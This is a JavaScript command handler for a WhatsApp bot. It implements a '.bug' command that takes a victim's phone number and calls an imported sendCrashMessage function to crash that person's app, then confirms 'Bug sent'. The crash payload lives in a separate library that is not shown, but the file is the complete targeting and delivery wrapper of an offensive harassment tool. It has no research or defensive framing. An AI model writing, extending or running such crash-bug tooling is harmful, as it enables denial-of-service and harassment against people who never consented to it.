const { sendCrashMessage } = require('../lib/bugfunctions');
const {
  isWhitelisted,
  normalizeNumber,
  getText,
  getSender,
  toJid
} = require('../Utils/helper');

async function bugCommand(sock, chatId, message) {
  try {
    if (chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: '❌ Private only command'
      }, { quoted: message });
    }

    const text = getText(message);
    const args = text.trim().split(/\s+/);

    const sender = getSender(message);

    if (!isWhitelisted(sender)) {
      return sock.sendMessage(chatId, {
        text: '❌ Not whitelisted'
      }, { quoted: message });
    }

    let number = normalizeNumber(args[1]);

    if (!number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .bug 2547xxxxxxx'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `⏳ Sending bug to ${number}...`
    }, { quoted: message });

    await sendCrashMessage(sock, target);

    await sock.sendMessage(chatId, {
      text: `✅ Bug sent to ${number}`
    }, { quoted: message });

  } catch (e) {
    console.error(e);
  }
}

module.exports = bugCommand;
